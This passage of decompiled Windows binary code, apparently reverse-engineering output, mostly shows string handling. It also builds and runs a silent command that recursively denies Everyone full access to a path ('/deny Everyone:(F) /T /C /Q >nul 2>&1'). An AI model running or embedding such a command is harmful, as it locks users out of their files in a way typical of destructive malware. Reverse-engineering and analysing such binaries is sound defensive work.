    uVar2 = *(undefined4 *)((longlong)pppppcVar11 + 4);
    uVar3 = *(undefined4 *)(pppppcVar11 + 1);
    uVar4 = *(undefined4 *)((longlong)pppppcVar11 + 0xc);
    *(undefined4 *)(puVar29 + 0x48) = *(undefined4 *)pppppcVar11;
    *(undefined4 *)(puVar29 + 0x4c) = uVar2;
    *(undefined4 *)(puVar29 + 0x50) = uVar3;
    *(undefined4 *)(puVar29 + 0x54) = uVar4;
    ppppcVar15 = pppppcVar11[3];
    *(char *****)(puVar29 + 0x58) = pppppcVar11[2];
    *(char *****)(puVar29 + 0x60) = ppppcVar15;
    pppppcVar11[2] = (char ****)0x0;
    pppppcVar11[3] = (char ****)0xf;
    *(undefined1 *)pppppcVar11 = 0;
    *(undefined8 *)(puVar29 + -8) = 0x14001147b;
    plVar10 = (longlong *)
              FUN_1400183c0(puVar29 + 0x48,"\" /deny Everyone:(F) /T /C /Q >nul 2>&1",0x27);
    puVar6 = (undefined1 *)*plVar10;
    lVar32 = plVar10[1];
    *(undefined1 **)(puVar29 + 0x68) = puVar6;
    *(longlong *)(puVar29 + 0x70) = lVar32;
    lVar32 = plVar10[2];
    uVar17 = plVar10[3];
    *(longlong *)(puVar29 + 0x78) = lVar32;
    *(ulonglong *)(puVar29 + 0x80) = uVar17;
    plVar10[2] = 0;
    plVar10[3] = 0xf;
    *(undefined1 *)plVar10 = 0;
    puVar19 = puVar29 + 0x68;
    if (0xf < uVar17) {
      puVar19 = puVar6;
    }
    *(undefined8 *)(puVar29 + -8) = 0x1400114c5;
    FUN_1400183c0(&local_300,puVar19,lVar32);
    if (0xf < (ulonglong)alStack_318[2]) break;
LAB_140011503:
    uVar17 = *(ulonglong *)(puVar29 + 0x60);
    if (0xf < uVar17) {
      uVar20 = uVar17 + 1;
      lVar32 = *(longlong *)(puVar29 + 0x48);
      lVar14 = lVar32;
      if (0xfff < uVar20) {
        lVar14 = *(longlong *)(lVar32 + -8);
        if (0x1f < (lVar32 - lVar14) - 8U) goto LAB_1400115ef;
        uVar20 = uVar17 + 0x28;
      }
      *(undefined8 *)(puVar29 + -8) = 0x140011540;
      FUN_140026c34(lVar14,uVar20);
    }
    *(undefined8 *)(puVar29 + 0x58) = 0;
    *(undefined8 *)(puVar29 + 0x60) = 0xf;
    puVar29[0x48] = 0;
    if (0xf < uStack_268) {
      uVar17 = uStack_268 + 1;
      pppppcVar11 = (char *****)local_280;
      if (0xfff < uVar17) {
        pppppcVar11 = (char *****)local_280[-1];
        if ((char *)0x1f < (char *)((longlong)local_280 + (-8 - (longlong)pppppcVar11)))
        goto LAB_1400115f6;
        uVar17 = uStack_268 + 0x28;
      }
      *(undefined8 *)(puVar29 + -8) = 0x14001158a;
      FUN_140026c34(pppppcVar11,uVar17);
    }
    pppppcVar11 = (char *****)(ulonglong)(iVar30 + 1U);
    if (*(longlong *)(pIVar34[0xbc1].e_program + (longlong)(int)(iVar30 + 1U) * 8 + 0x18) == 0)
    goto LAB_14001159e;
  }
  uVar17 = alStack_318[2] + 1;
  lVar32 = *(longlong *)(puVar29 + 0x68);
  lVar14 = lVar32;
  if (uVar17 < 0x1000) {
LAB_1400114fd:
    *(undefined8 *)(puVar29 + -8) = 0x140011502;
    FUN_140026c34(lVar14,uVar17);
    goto LAB_140011503;
  }
  lVar14 = *(longlong *)(lVar32 + -8);
  if ((lVar32 - lVar14) - 8U < 0x20) {
    uVar17 = alStack_318[2] + 0x28;
    goto LAB_1400114fd;
  }
  pcVar1 = (code *)swi(0x29);
  (*pcVar1)(5);
  puVar29 = puVar29 + 8;
LAB_1400115ef:
  pcVar1 = (code *)swi(0x29);
  (*pcVar1)(5);
  puVar29 = puVar29 + 8;
LAB_1400115f6:
  pcVar1 = (code *)swi(0x29);
  (*pcVar1)(5);
  puVar29 = puVar29 + 8;
LAB_1400115fd:
  pcVar1 = (code *)swi(0x29);
  pppppuVar12 = (undefined8 *****)(*pcVar1)(5);
  puVar29 = puVar29 + 8;
LAB_140011607:
  *(undefined8 *)(puVar29 + -8) = 0x14001160c;
  FUN_140026c34(pppppuVar12);
LAB_14001160c:
  *(undefined8 *)(puVar29 + -8) = 0x14001161b;
  return;
LAB_14001159e:
  pppppuVar12 = &local_300;
  if (0xf < local_2e8) {
    pppppuVar12 = (undefined8 *****)local_300;
  }
  *(undefined8 *)(puVar29 + -8) = 0x1400115b6;
  FUN_14000ff20(pppppuVar12,120000);
  if (local_2e8 < 0x10) goto LAB_14001160c;
  pppppuVar12 = (undefined8 *****)local_300;
  if ((0xfff < local_2e8 + 1) &&
     (pppppuVar12 = (undefined8 *****)local_300[-1],
     0x1f < (ulonglong)((longlong)local_300 + (-8 - (longlong)pppppuVar12)))) goto LAB_1400115fd;
  goto LAB_140011607;
}

